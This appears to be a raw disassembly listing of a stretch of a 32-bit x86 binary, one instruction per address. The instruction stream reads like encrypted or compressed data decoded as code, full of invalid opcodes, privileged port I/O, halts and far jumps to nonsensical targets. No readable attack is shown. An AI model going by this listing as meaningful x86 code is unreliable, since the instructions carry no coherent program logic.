  418178:	fistp  WORD PTR [ecx+eiz*8]
  41817b:	add    ah,BYTE PTR [eax]
  41817d:	sbb    eax,edi
  41817f:	enter  0x9915,0xcb
  418183:	std    
  418184:	pushf  
  418185:	lea    eax,[ebp-0xb]
  418188:	test   eax,0xf6e5d248
  41818d:	jl     0x4181de
  41818f:	call   0x42184571
  418194:	out    dx,al
  418195:	ss repnz test ecx,eax
  418199:	mov    eax,0x2a409a0b
  41819e:	in     al,0x6f
  4181a0:	imul   ebx,DWORD PTR [edx-0x6740792],0xffffffae
  4181a7:	enter  0x469,0xe5
  4181ab:	bound  esi,QWORD PTR [eax+0x73]
  4181ae:	mov    cl,0xdf
  4181b0:	and    al,0x97
  4181b2:	inc    ebp
  4181b3:	cmp    eax,0x66ce6dc6
  4181b8:	sub    BYTE PTR [ebp-0x41],al
  4181bb:	inc    ecx
  4181bc:	inc    ecx
  4181bd:	mov    DWORD PTR [ebp*4-0x1fa643de],esi
  4181c4:	ds xor al,0xa
  4181c7:	xchg   ecx,eax
  4181c8:	add    DWORD PTR [ebx+eax*2],esi
  4181cb:	rcr    DWORD PTR ds:0x4ba56a0a,cl
  4181d1:	and    cl,BYTE PTR [ebp-0x44fe19ad]
  4181d7:	add    eax,0x161b120a
  4181dc:	cli    
  4181dd:	sbb    edx,esp
  4181df:	pop    ds
  4181e0:	push   edi
  4181e1:	push   0x7c
  4181e3:	mov    eax,ds:0x5788e655
  4181e8:	shl    cl,1
  4181ea:	(bad)  
  4181eb:	pause  
  4181ed:	(bad)  
  4181ee:	popa   
  4181ef:	and    DWORD PTR [esi+0x4f24e73a],0x5e
  4181f6:	mov    bl,0x26
  4181f8:	pushf  
  4181f9:	pushf  
  4181fa:	jmp    0xe863:0xc2ab456d
  418201:	jbe    0x4181ad
  418203:	stc    
  418204:	fdiv   st,st(4)
  418206:	pop    es
  418207:	dec    eax
  418208:	pusha  
  418209:	xchg   ebx,eax
  41820a:	mov    gs:0xc46f28bf,eax
  418210:	dec    esi
  418211:	scas   al,BYTE PTR es:[edi]
  418212:	add    edx,eax
  418214:	lock addr16 mov dl,0x81
  418218:	retf   
  418219:	stos   BYTE PTR es:[edi],al
  41821a:	mov    ah,0x92
  41821c:	mov    eax,0x8570a040
  418221:	test   BYTE PTR [esi+0x3c3768d6],dh
  418227:	es ja  0x418212
  41822a:	push   DWORD PTR [edx+0x5c8e64f7]
  418230:	cmp    DWORD PTR gs:[edi+ecx*1-0x1],0xffffffd2
  418236:	fs sbb al,0xc5
  418239:	mov    esi,0x9269738
  41823e:	ins    BYTE PTR es:[edi],dx
  41823f:	lahf   
  418240:	pop    esi
  418241:	dec    edi
  418242:	inc    ebp
  418243:	aad    0x97
  418245:	out    dx,eax
  418246:	mov    dh,0x96
  418248:	fs pusha 
  41824a:	je     0x4181f8
  41824c:	adc    al,0xa2
  41824e:	in     eax,0x59
  418250:	cmp    DWORD PTR [ebp-0x49],esp
  418253:	ds ins DWORD PTR es:[edi],dx
  418255:	mov    edx,0x85bc80a5
  41825a:	(bad)  
  41825b:	lock shr DWORD PTR [edi-0xf46c9c1],1
  418262:	fs sbb eax,0xa7c04b26
  418268:	aaa    
  418269:	and    al,dh
  41826b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41826c:	xor    bl,BYTE PTR [edi-0x7f]
  41826f:	es ja  0x41825f
  418272:	sub    edi,DWORD PTR [ecx+edi*1]
  418275:	daa    
  418276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418277:	call   0xc2ac37fe
  41827c:	mov    cl,0x82
  41827e:	ja     0x41821f
  418280:	ins    BYTE PTR es:[edi],dx
  418281:	mov    eax,ds:0x422a7e34
  418286:	pusha  
  418287:	add    DWORD PTR [edi-0x1fde5100],ebx
  41828d:	hlt    
  41828e:	inc    esi
  41828f:	jnp    0x41821f
  418291:	jge    0x41823d
  418293:	adc    eax,0x42e00ea1
  418298:	pop    esp
  418299:	xlat   BYTE PTR ds:[ebx]
  41829a:	out    0x35,al
  41829c:	test   ebp,edx
  41829e:	dec    ebp
  41829f:	sti    
  4182a0:	repnz push ecx
  4182a2:	hlt    
  4182a3:	in     eax,0xd8
  4182a5:	clc    
  4182a6:	or     ebp,DWORD PTR [edi+edx*1-0x75283f9]
  4182ad:	and    esp,DWORD PTR [ecx-0x3af4cb87]
  4182b3:	sbb    eax,DWORD PTR [ebx]
  4182b5:	add    BYTE PTR [esi-0x55],bl
  4182b8:	inc    edi
  4182b9:	xabort 0x7b
  4182bc:	ds jmp 0x9a53:0x86dad25c
  4182c4:	pop    ebx
  4182c5:	pop    edi
  4182c6:	repz sbb ebx,ecx
  4182c9:	mov    edi,0x3063c1c8
  4182ce:	mov    dl,0x66
  4182d0:	bound  esp,QWORD PTR [esi]
  4182d2:	dec    edx
  4182d3:	adc    DWORD PTR [edi-0x21320b4b],ebx
  4182d9:	pop    edx
  4182da:	jae    0x418348
  4182dc:	pop    ss
  4182dd:	in     eax,dx
  4182de:	mov    esp,0xb7fa9ba4
  4182e3:	sbb    ah,BYTE PTR [eax]
  4182e5:	xor    esi,ecx
  4182e7:	aas    
  4182e8:	fwait
  4182e9:	repnz pop ebp
  4182eb:	mov    BYTE PTR [edx-0x6f],dh
  4182ee:	pop    esp
  4182ef:	repz mov cl,0xf3
  4182f2:	aaa    
  4182f3:	mov    ah,0x45
  4182f5:	lock fst st(0)
  4182f8:	int    0x73
  4182fa:	push   ss
  4182fb:	adc    DWORD PTR gs:[ecx],edx
  4182fe:	pop    ebx
  4182ff:	lds    ebx,FWORD PTR [ebx]
  418301:	mov    ebp,0x4f74489b
  418306:	addr16 ror ebp,0x57
  41830a:	fwait
  41830b:	xchg   ecx,eax
  41830c:	(bad)  
  41830d:	pop    edx
  41830e:	vpunpckhqdq xmm4,xmm4,xmm6
  418312:	call   0x5cb2:0x917d38bb
  418319:	cli    
  41831a:	cwde   
  41831b:	adc    edx,DWORD PTR [edx]
  41831d:	inc    edx
  41831e:	inc    ebx
  41831f:	ja     0x4182f7
  418321:	and    al,0x76
  418323:	dec    esi
  418324:	dec    ebp
  418325:	inc    DWORD PTR [eax-0x65277a1c]
  41832b:	dec    esp
  41832c:	(bad)  
  41832e:	sahf   
  41832f:	pop    ebx
  418330:	(bad)  
  418331:	jge    0x4182f4
  418333:	ins    BYTE PTR es:[edi],dx
  418334:	mov    eax,ds:0x59869e6
  418339:	and    BYTE PTR ds:0x811817cb,al
  41833f:	mov    ds:0x2d76e6c7,al
  418344:	aaa    
  418345:	not    DWORD PTR [ebp+0xf]
  418348:	imul   ebx,DWORD PTR [edx+ecx*2+0x7],0x27419df1
  418350:	inc    ebx
  418351:	idiv   BYTE PTR [edx]
  418353:	pusha  
  418354:	inc    ebx
  418355:	(bad)  
  418356:	out    dx,al
  418357:	mov    WORD PTR [edi],es
  418359:	outs   dx,BYTE PTR ds:[esi]
  41835a:	mov    bh,0xf7
  41835c:	nop
  41835d:	mov    bh,0xe0
  41835f:	iret   
  418360:	sti    
  418361:	xchg   edx,eax
  418362:	pop    ebp
  418363:	retf   0x31d2
  418366:	inc    esi
  418367:	and    ebp,ebx
  418369:	imul   ecx,DWORD PTR [eax],0x2053dd30
  41836f:	loopne 0x418313
  418371:	mov    edx,0x7587d064
  418376:	leave  
  418377:	cmp    al,0xfb
  418379:	or     ecx,DWORD PTR [eax+0x5cbe5d2e]
  41837f:	imul   ebx,DWORD PTR [ecx],0x919693af
  418385:	jl     0x418344
  418387:	xchg   esp,eax
  418388:	fcom   st(6)
  41838a:	ja     0x418406
  41838c:	imul   ebx,DWORD PTR [ebx-0x32f330e9],0xc7882c70
  418396:	loopne 0x4183cf
  418398:	call   0x12e13e5a
  41839d:	les    edi,FWORD PTR [eax]
  41839f:	cs fcmovnb st,st(3)
  4183a2:	inc    ebp
  4183a3:	popa   
  4183a4:	test   BYTE PTR [eax],cl
  4183a6:	or     eax,0xdc5c6c33
  4183ac:	sbb    BYTE PTR [edx+0x38],dl
  4183af:	test   al,0x91
  4183b1:	ds ret 0xf6f2
  4183b5:	out    dx,eax
  4183b6:	xlat   BYTE PTR ds:[ebx]
  4183b7:	fidivr DWORD PTR [ecx-0x5fa4e178]
  4183bd:	jae    0x41836c
  4183bf:	div    BYTE PTR [eax-0x48]
  4183c2:	or     al,0x6b
  4183c4:	sti    
  4183c5:	(bad)  
  4183c6:	cmp    eax,0xe4555513
  4183cb:	pop    esp
  4183cc:	pop    ds
  4183cd:	iret   
  4183ce:	in     al,0x7
  4183d0:	in     eax,dx
  4183d1:	xor    BYTE PTR [edi-0x20c1c503],ah
  4183d7:	cmc    
  4183d8:	cmc    
  4183d9:	icebp  
  4183da:	mov    dh,0xb
  4183dc:	daa    
  4183dd:	inc    edi
  4183de:	xor    dl,BYTE PTR [edx+eiz*8-0x35]
  4183e2:	ins    DWORD PTR es:[edi],dx
  4183e3:	mov    cl,0xfd
  4183e5:	popa   
  4183e6:	push   esi
  4183e8:	scas   al,BYTE PTR es:[edi]
  4183e9:	sub    eax,0x31d3d718
  4183ee:	pop    ecx
  4183ef:	push   esi
  4183f0:	lods   al,BYTE PTR ds:[esi]
  4183f1:	stc    
  4183f2:	cmp    eax,0xd1c0c8c4
  4183f7:	mov    dl,0x84
  4183f9:	cmp    eax,0x9f16cc3f
  4183fe:	mov    ebx,ebp
  418400:	adc    eax,0xba208e53
  418405:	jmp    0x41838e
  418407:	jae    0x418458
  418409:	ins    BYTE PTR es:[edi],dx
  41840a:	test   eax,0xc57c8047
  41840f:	xchg   ebx,eax
  418410:	ss mov dh,0x3c
  418413:	and    DWORD PTR [esi+0x3],esp
  418416:	hlt    
  418417:	call   0x4d41:0xc0d040c6
  41841e:	add    edx,DWORD PTR [edx]
  418420:	cwde   
  418421:	es mov ah,0xb8
  418424:	sbb    bl,dh
  418426:	fisttp WORD PTR [ebx-0x6e]
  418429:	pop    eax
  41842a:	cmp    BYTE PTR [eax-0x5c],ah
  41842d:	push   ebp
  41842e:	hlt    
  41842f:	sahf   
  418430:	jmp    0xc754:0x9d9f3b3b
  418437:	push   edi
  418438:	push   eax
  418439:	xchg   edi,eax
  41843a:	push   eax
  41843b:	cdq    
  41843c:	jmp    edx
  41843e:	cmp    DWORD PTR [edx+0x61],eax
  418441:	fs push edx
  418443:	(bad)  
  418444:	xchg   edx,eax
  418445:	dec    edi
  418446:	pop    ebx
  418447:	and    eax,0xb97d97fc
  41844c:	or     ch,ah
  41844e:	shl    esi,1
  418450:	or     edi,ebx
  418452:	pop    ebx
  418453:	adc    DWORD PTR [ebx+0x0],eax
  418456:	test   eax,esp
  418458:	test   eax,0x5fadfb8f
  41845d:	retf   0xfe07
  418460:	mov    dh,0x85
  418462:	sbb    DWORD PTR [ebx+0x7a],eax
  418465:	dec    esp
  418466:	mul    ch
  418468:	add    BYTE PTR [edi+0x6c],al
  41846b:	xchg   edi,eax
  41846c:	mov    eax,0x8859f82e
  418471:	cld    
  418472:	jmp    0x1cf92bfd
  418477:	js     0x41845e
  418479:	mov    ecx,0x68f4288f
  41847e:	bound  edx,QWORD PTR [esi+0x499b2d8c]
  418484:	push   esp
  418485:	hlt    
  418486:	xlat   BYTE PTR ds:[ebx]
  418487:	xchg   esp,eax
  418488:	retf   
  418489:	idiv   DWORD PTR [edi-0x4f]
  41848c:	pop    edx
  41848d:	push   esp
  41848e:	cli    
  41848f:	mov    edx,0x29917d01
  418494:	dec    edi
  418495:	or     al,0x61
  418497:	cdq    
  418498:	sub    dl,BYTE PTR [edx]
  41849a:	loopne 0x4184a1
  41849c:	jmp    0x563597e2
  4184a1:	and    BYTE PTR [edx],ah
  4184a3:	mov    al,ds:0xa0807242
  4184a8:	push   ss
  4184a9:	or     BYTE PTR [ebp-0x25fd5de5],bl
  4184af:	lahf   
  4184b0:	arpl   si,si
  4184b2:	xor    DWORD PTR [edx-0xb],esi
  4184b5:	gs ins DWORD PTR es:[edi],dx
  4184b7:	jmp    0x4184bf
  4184b9:	jmp    DWORD PTR [ecx+0x4f33c8f4]
  4184bf:	push   0xffffffe3
  4184c1:	cdq    
  4184c2:	push   es
  4184c3:	loop   0x4184cf
  4184c5:	push   ebp
  4184c6:	retf   0x308c
  4184c9:	cmp    BYTE PTR [edx+0x36],ch
  4184cc:	scas   al,BYTE PTR es:[edi]
  4184cd:	mov    fs,edi
  4184cf:	mov    al,ds:0x9a1e1b4c
  4184d4:	not    BYTE PTR [eax+0x1118cf1]
  4184da:	cmp    eax,0x5c840fae
  4184df:	stc    
  4184e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184e1:	xor    al,BYTE PTR [ecx+0xc0a1fbc]
  4184e7:	xchg   esp,eax
  4184e8:	jecxz  0x418474
  4184ea:	pop    ecx
  4184eb:	mov    ch,0x9
  4184ed:	das    
  4184ee:	xor    eax,0xd5cda072
  4184f3:	pop    ecx
  4184f4:	inc    edi
  4184f5:	leave  
  4184f6:	mov    al,0xbc
  4184f8:	or     edi,edx
  4184fa:	imul   esp,DWORD PTR [edi],0xa08e574b
  418500:	les    edi,FWORD PTR [eax-0x44]
  418503:	adc    BYTE PTR [ebp-0x4c],dl
  418506:	arpl   si,dx
  418508:	in     eax,0x8f
  41850a:	mov    esp,0xe4e08812
  41850f:	ins    BYTE PTR es:[edi],dx
  418510:	pop    es
  418511:	and    eax,0xc6ad360d
  418516:	jb     0x4184b1
  418518:	rcl    bh,0x6a
  41851b:	hlt    
  41851c:	gs inc ebp
  41851e:	ja     0x4184d2
  418520:	aad    0xfc
  418522:	xchg   DWORD PTR [edx+ecx*2+0x43],ecx
  418526:	inc    ecx
  418527:	sti    
  418528:	xchg   esp,eax
  418529:	xchg   esp,eax
  41852a:	jo     0x41851f
  41852c:	push   edi
  41852d:	mov    cl,0xfc
  41852f:	in     eax,dx
  418530:	cmp    BYTE PTR [ebp-0x2],0xee
  418534:	enter  0xe23f,0x0
  418538:	enter  0xdd6a,0x79
  41853c:	push   ss
  41853d:	into   
  41853e:	loopne 0x418521
  418540:	sbb    esi,0xffffffb9
  418543:	push   ss
  418544:	div    BYTE PTR [esi+0x4e24d8f5]
  41854a:	xchg   esi,eax
  41854b:	je     0x41851a
  41854d:	and    edx,DWORD PTR [ebx+0x5d]
  418550:	sbb    ecx,edx
  418552:	popa   
  418553:	adc    al,0xcb
  418555:	loop   0x418548
  418557:	shl    BYTE PTR [ebx],0xa4
  41855a:	imul   ebp,DWORD PTR [esi-0x3e],0x74
  41855e:	test   DWORD PTR [edx-0x6a],0xd5a02efc
  418565:	xor    dh,BYTE PTR [edx+0x4d4d7438]
  41856b:	inc    esp
  41856c:	ins    BYTE PTR es:[edi],dx
  41856d:	jns    0x418574
  41856f:	scas   al,BYTE PTR es:[edi]
  418570:	dec    ecx
  418571:	mov    BYTE PTR [esi],ch
  418573:	mov    cl,0x64
  418575:	lock and esp,ecx
  418578:	lahf   
  418579:	test   DWORD PTR [edx+0xc99c682],esi
  41857f:	arpl   WORD PTR [edx-0x568eab84],sp
  418585:	ja     0x4185d2
  418587:	in     eax,dx
  418588:	push   esi
  418589:	pop    es
  41858a:	in     eax,dx
  41858b:	pop    edx
  41858c:	dec    esi
  41858d:	call   0x2550:0xd813bb3f
  418594:	push   eax
  418595:	popa   
  418596:	pop    esi
  418597:	dec    ecx
  418598:	jae    0x4185ed
  41859a:	mov    ecx,0x1f48c58a
  41859f:	jecxz  0x4185d3
  4185a1:	cs (bad) 
  4185a3:	in     al,0xad
  4185a5:	jg     0x4185d0
  4185a7:	sub    eax,0x423fcb9c
  4185ac:	int    0xe5
  4185ae:	fild   DWORD PTR ds:[edi+0x22]
  4185b2:	mov    al,ds:0x2cb980ff
  4185b7:	fbstp  TBYTE PTR [ebx+0x31]
  4185ba:	jno    0x418622
  4185bc:	leave  
  4185bd:	adc    DWORD PTR [ebx],esp
  4185bf:	cmp    al,0xec
  4185c1:	mov    ecx,0x1d72df37
  4185c6:	imul   ecx,edi,0x9c219a6b
  4185cc:	mov    ds:0xf6f8b546,eax
  4185d1:	fistp  DWORD PTR [edi+0x400368a4]
  4185d7:	mov    DWORD PTR [edx-0x8056ef4],0xcf325929
  4185e1:	jnp    0x41862d
  4185e3:	push   ebx
  4185e4:	or     esi,0x76
  4185e7:	dec    ebx
  4185e8:	call   0x50ae5302
  4185ed:	inc    eax
  4185ee:	inc    esp
  4185ef:	loop   0x418640
  4185f1:	rcr    ebx,0xe2
  4185f4:	inc    eax
  4185f5:	dec    edi
  4185f6:	inc    esp
  4185f7:	push   0x3c
  4185f9:	int    0xb4
  4185fb:	mov    ebp,DWORD PTR [edx+ecx*8+0x61]
  4185ff:	out    0x9a,al
  418601:	add    DWORD PTR [ecx-0x5b4fe096],eax
  418607:	mov    ds:0xf04c2131,eax
  41860c:	mov    edx,DWORD PTR [ecx]
  41860e:	cmp    cl,BYTE PTR [ebx-0x8]
  418611:	push   ss
  418612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418613:	ds jg  0x41859c
  418616:	in     al,0xa0
  418618:	fmul   st(1),st
  41861a:	scas   eax,DWORD PTR es:[edi]
  41861b:	cmp    eax,0x8a1f2882
  418620:	iret   
  418621:	jge    0x4185ad
  418623:	jmp    0x41860b
  418625:	jle    0x418659
  418627:	pusha  
  418628:	sub    al,BYTE PTR [ecx]
  41862a:	dec    esi
  41862b:	jp     0x4185ad
  41862d:	(bad)  
  41862e:	pop    edx
  41862f:	mov    DWORD PTR [ebp-0x17829571],ebx
  418635:	pop    ds
  418636:	cmp    esp,ebp
  418638:	xor    al,0xb
  41863a:	xor    eax,0x1d1f34a6
  41863f:	in     al,dx
  418640:	ficom  WORD PTR [ecx-0x23]
  418643:	pushf  
  418644:	not    DWORD PTR [eax+0x83a968d]
  41864a:	lahf   
  41864b:	jbe    0x418673
  41864d:	cwde   
  41864e:	dec    esi
  41864f:	xor    ch,BYTE PTR [ecx]
  418651:	dec    ecx
  418652:	add    ecx,DWORD PTR [esp+edx*1-0xa]
  418656:	adc    al,bl
  418658:	or     BYTE PTR [ebp-0x5f],al
  41865b:	inc    eax
  41865c:	idiv   bl
  41865e:	scas   eax,DWORD PTR es:[edi]
  41865f:	jge    0x41863a
  418661:	enter  0x580,0x59
  418665:	into   
  418666:	inc    esp
  418667:	popa   
  418668:	sbb    cl,dl
  41866a:	push   edi
  41866b:	repnz lock sbb dl,0x94
  418670:	mul    esi
  418672:	dec    edi
  418673:	cmp    eax,0x203085c8
  418678:	push   edi
  418679:	cmp    esi,DWORD PTR [esi]
  41867b:	xor    al,0xf3
  41867d:	fcmovu st,st(4)
  41867f:	pusha  
  418680:	xchg   DWORD PTR [esi+0x1d],ecx
  418683:	int3   
  418684:	call   0x8683c56e
  418689:	adc    ebp,DWORD PTR [ebp+ecx*2-0xf03f191]
  418690:	jl     0x41869c
  418692:	and    DWORD PTR [edx+0x5f],ecx
  418695:	and    ebx,DWORD PTR [ebx]
  418697:	clc    
  418698:	mov    ebp,0x48a7a451
  41869d:	mov    bh,0x99
  41869f:	stc    
  4186a0:	out    dx,al
  4186a1:	pop    ebx
  4186a2:	jb     0x4186b0
  4186a4:	ret    0xb396
  4186a7:	or     al,0xac
  4186a9:	dec    edi
  4186aa:	xor    eax,0x55b16db3
  4186af:	leave  
  4186b0:	seta   BYTE PTR [ebp+0x7a7cc71d]
  4186b7:	push   DWORD PTR [ebx-0x65]
  4186ba:	ins    BYTE PTR es:[edi],dx
  4186bb:	pop    ebx
  4186bc:	jne    0x418640
  4186be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186bf:	ror    BYTE PTR [ecx+eiz*4-0x25],cl
  4186c3:	clc    
  4186c4:	ds or  eax,0x596667a
  4186ca:	cmp    esi,edx
  4186cc:	pop    ds
  4186cd:	gs cdq 
  4186cf:	mov    ds:0x19d82481,al
  4186d4:	into   
  4186d5:	scas   al,BYTE PTR es:[edi]
  4186d6:	and    DWORD PTR [edi+0x1c],edx
  4186d9:	xor    cl,BYTE PTR [ebp+0x47]
  4186dc:	jl     0x41869e
  4186de:	or     bl,BYTE PTR [ebx+0x73]
  4186e1:	hlt    
  4186e2:	sbb    BYTE PTR [eax],cl
  4186e4:	sub    DWORD PTR [edx+0x46],ecx
  4186e7:	test   eax,0xd0f6b6b7
  4186ec:	xchg   esp,eax
  4186ed:	out    dx,eax
  4186ee:	data16 add dl,dh
  4186f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186f2:	pop    ds
  4186f3:	jbe    0x418695
  4186f5:	xor    DWORD PTR [esi],ecx
  4186f7:	gs test eax,0xf0c2a342
  4186fd:	pusha  
  4186fe:	fcom   st(5)
  418700:	ret    0x7a06
  418703:	sub    ecx,DWORD PTR [esi+0x46]
  418706:	xchg   ecx,eax
  418707:	aad    0x61
  418709:	xor    eax,0x8c2e9f50
  41870e:	out    0xf3,eax
  418710:	add    DWORD PTR [edi],esi
  418712:	mov    ch,0x5a
  418714:	sbb    eax,DWORD PTR [eax]
	...
  4188e6:	add    BYTE PTR [eax],al
  4188e8:	add    BYTE PTR [esi-0x77],bl
  4188eb:	add    eax,0x7feed766
  4188f0:	mov    ecx,0x4f6277d8
  4188f5:	fidivr DWORD PTR [ebp+0x4ce5ea40]
  4188fb:	add    DWORD PTR [eax],eax
  4188fd:	and    eax,0x18000007
  418902:	adc    ecx,esp
  418904:	xchg   edi,eax
  418905:	(bad)  
  418907:	call   0xc346:0x63b68a31
  41890e:	pop    ebp
  41890f:	aam    0x73
  418911:	mov    al,0x46
  418913:	cli    
  418914:	pushf  
  418915:	adc    BYTE PTR [ebp+eax*8+0x72],ah
  418919:	shl    BYTE PTR [ecx+0xd],1
  41891c:	add    DWORD PTR [edx],edi
  41891e:	lock inc eax
  418920:	outs   dx,BYTE PTR ds:[esi]
  418921:	neg    edx
  418923:	hlt    
  418924:	mov    dl,0xbb
  418926:	lds    eax,FWORD PTR [ebp-0x1e4ba303]
  41892c:	jnp    0x41893b
  41892e:	and    al,BYTE PTR [edx+esi*1-0x4227fb87]
  418935:	addr16 hlt 
  418937:	and    eax,0x497f873c
  41893c:	xlat   BYTE PTR ds:[ebx]
  41893d:	int3   
  41893e:	addr16 cmp ebx,edx
  418941:	adc    eax,esi
  418943:	mov    ds:0x7bd05082,al
  418948:	scas   eax,DWORD PTR es:[edi]
  418949:	adc    edx,DWORD PTR [ecx]
  41894b:	gs fcom st(2)
  41894e:	les    ecx,FWORD PTR [ecx-0x71]
  418951:	fwait
  418952:	stos   DWORD PTR es:[edi],eax
  418953:	sub    eax,0x37d3751d
  418958:	es mov bl,0xa3
  41895b:	push   ss
  41895c:	add    dh,dl
  41895e:	scas   eax,DWORD PTR es:[edi]
  41895f:	je     0x41892d
  418961:	in     eax,dx
  418962:	outs   dx,BYTE PTR ds:[esi]
  418963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418964:	loopne 0x418962
  418966:	imul   edx,ecx,0xffffffe7
  418969:	repz cmp BYTE PTR [ebx+0x5a],dl
  41896d:	mov    esi,0xe1e23ed2
  418972:	(bad)  
  418973:	gs inc esp
  418975:	stos   DWORD PTR es:[edi],eax
  418976:	sub    al,0x54
  418978:	psubsb mm3,QWORD PTR [ecx-0x24]
  41897c:	jb     0x4189a4
  41897e:	scas   eax,DWORD PTR es:[edi]
  41897f:	fbstp  TBYTE PTR [edi+0x39]
  418982:	inc    ebp
  418983:	mul    DWORD PTR [edi]
  418985:	mov    ds:0x98345c4c,al
  41898a:	and    eax,0xb55c72dc
  41898f:	mov    es,ebx
  418991:	in     eax,0x29
  418993:	clc    
  418994:	jle    0x4189ca
  418996:	sub    esi,edx
  418998:	rcl    eax,cl
  41899a:	mul    DWORD PTR [ecx+0x1e52b489]
  4189a0:	test   BYTE PTR [edi],al
  4189a2:	imul   eax,DWORD PTR [eax+esi*2-0x5e],0x3
  4189a7:	dec    edi
  4189a8:	xchg   cl,cl
  4189aa:	aas    
  4189ab:	test   eax,0x4611b0eb
  4189b0:	das    
  4189b1:	dec    ebp
  4189b2:	enter  0x47bf,0xa7
  4189b6:	into   
  4189b7:	cld    
  4189b8:	push   edx
  4189b9:	pop    ds
  4189ba:	jl     0x4189ca
  4189bc:	pop    edi
  4189bd:	in     al,0x79
  4189bf:	outs   dx,DWORD PTR ds:[esi]
  4189c0:	or     al,0xa7
  4189c2:	jne    0x418a0b
  4189c4:	mov    ch,0x62
  4189c6:	add    al,0x35
  4189c8:	sub    BYTE PTR [ecx+0x46],dh
  4189cb:	fdivr  DWORD PTR [ebx-0x60840667]
  4189d1:	out    dx,eax
  4189d2:	test   al,0x9f
  4189d4:	xor    eax,0x91ba5366
  4189d9:	adc    bh,al
  4189db:	pop    es
  4189dc:	add    BYTE PTR [ecx-0x11],cl
  4189df:	jmp    0x7dc5d69
  4189e4:	adc    esi,edi
  4189e6:	xchg   esp,eax
  4189e7:	lods   eax,DWORD PTR ds:[esi]
  4189e8:	sub    eax,0x8b38ea46
  4189ed:	push   ss
  4189ee:	fldcw  WORD PTR [ebx+0x26]
  4189f1:	fwait
  4189f2:	icebp  
  4189f3:	add    bl,BYTE PTR [edx-0x39cd096b]
  4189f9:	fucom  st(1)
  4189fb:	sahf   
  4189fc:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4189fe:	or     DWORD PTR [ecx+eiz*2],ecx
  418a01:	cwde   
  418a02:	push   cs
  418a03:	out    0xe8,al
  418a05:	pop    ebx
  418a06:	inc    ebx
  418a07:	push   ebx
  418a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a09:	es stc 
  418a0b:	cmc    
  418a0c:	xchg   ecx,eax
  418a0d:	cs jp  0x4189dd
  418a10:	stos   BYTE PTR es:[edi],al
  418a11:	jmp    0xfd39b5ae
  418a16:	cdq    
  418a17:	cwde   
  418a18:	xchg   esp,eax
  418a19:	xlat   BYTE PTR ds:[ebx]
  418a1a:	xchg   esi,eax
  418a1b:	mov    eax,0x7a07d198
  418a20:	scas   eax,DWORD PTR es:[edi]
  418a21:	outs   dx,DWORD PTR ds:[esi]
  418a22:	jne    0x418a92
  418a24:	and    eax,0xc461aaf3
  418a29:	pop    ebx
  418a2a:	adc    eax,eax
  418a2c:	add    eax,0xbab247d9
  418a31:	jecxz  0x4189be
  418a33:	data16 cld 
  418a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a36:	add    DWORD PTR [ebp*8-0x517f974c],ebp
  418a3d:	sub    cl,ah
  418a3f:	mov    edi,ebx
  418a41:	in     al,0x49
  418a43:	jl     0x4189f3
  418a45:	in     al,dx
  418a46:	sub    BYTE PTR ss:0xbc003e80,0x4e
  418a4e:	dec    eax
  418a4f:	adc    eax,DWORD PTR [edi-0x37]
  418a52:	fcom   DWORD PTR [ecx-0x48944628]
  418a58:	stos   BYTE PTR es:[edi],al
  418a59:	jne    0x418a98
  418a5b:	cwde   
  418a5c:	(bad)  
  418a5d:	pop    esp
  418a5e:	mov    DWORD PTR [eax+0x0],ecx
  418a61:	mov    dh,0x58
  418a63:	dec    esp
  418a64:	out    dx,al
  418a65:	hlt    
  418a66:	lds    eax,FWORD PTR [esi+0x63]
  418a69:	add    BYTE PTR [edx-0x35093c13],bh
  418a6f:	shl    BYTE PTR [esi],0x9d
  418a72:	cmp    dh,BYTE PTR [esi]
  418a74:	inc    esp
  418a75:	mov    eax,0x550f1341
  418a7a:	push   esi
  418a7b:	inc    ecx
  418a7c:	or     al,0xeb
  418a7e:	stos   DWORD PTR es:[edi],eax
  418a7f:	or     bl,ch
  418a81:	neg    BYTE PTR [eax+edi*2]
  418a84:	cmovl  ebp,DWORD PTR [edx+0x30fdd977]
  418a8b:	lea    edi,[ecx+edi*1]
  418a8e:	adc    DWORD PTR [eax],eax
  418a90:	je     0x418aa8
  418a92:	adc    DWORD PTR [ecx+0x3bd3689b],ecx
  418a98:	fs lahf 
  418a9a:	pop    ebx
  418a9b:	mov    dl,0x7c
  418a9d:	adc    DWORD PTR [eax-0x14],ecx
  418aa0:	sub    eax,0x3ceac2a7
  418aa5:	pop    edi
  418aa6:	idiv   ebx
  418aa8:	xchg   edi,eax
  418aa9:	hlt    
  418aaa:	dec    BYTE PTR cs:[ecx+0x37]
  418aae:	add    al,0x5f
  418ab0:	push   0x2a
  418ab2:	(bad)  
  418ab3:	pop    ebp
  418ab4:	pop    esi
  418ab5:	nop
  418ab6:	popf   
  418ab7:	cwde   
  418ab8:	cmp    al,0xf
  418aba:	sbb    esi,DWORD PTR [ebp+0x57]
  418abd:	sbb    al,0xb5
  418abf:	add    BYTE PTR [esi+0x6caafbd4],0x9c
  418ac6:	and    al,0x41
  418ac8:	xor    DWORD PTR [esi+ebx*1-0x68],ebx
  418acc:	inc    edi
  418acd:	adc    BYTE PTR [edi],dh
  418acf:	rcl    cl,0xd1
  418ad2:	lock xchg esi,eax
  418ad4:	inc    edi
  418ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad6:	outs   dx,DWORD PTR ds:[esi]
  418ad7:	push   es
  418ad8:	ds retf 0xe7ea
  418adc:	shr    BYTE PTR [eax+ebp*2-0x20],0x9a
  418ae1:	std    
  418ae2:	dec    ecx
  418ae3:	lds    esi,FWORD PTR [eax-0x537629ae]
  418ae9:	mov    bh,ch
  418aeb:	ins    DWORD PTR es:[edi],dx
  418aec:	inc    ebx
  418aed:	dec    ebx
  418aee:	(bad)  
  418aef:	xor    eax,DWORD PTR [edx+ecx*8-0x2b]
  418af3:	pop    DWORD PTR [ebx-0x2d]
  418af6:	adc    BYTE PTR [eax+0x197aafa6],bl
  418afc:	jb     0x418a85
  418afe:	inc    eax
  418aff:	pop    ds
  418b00:	(bad)  
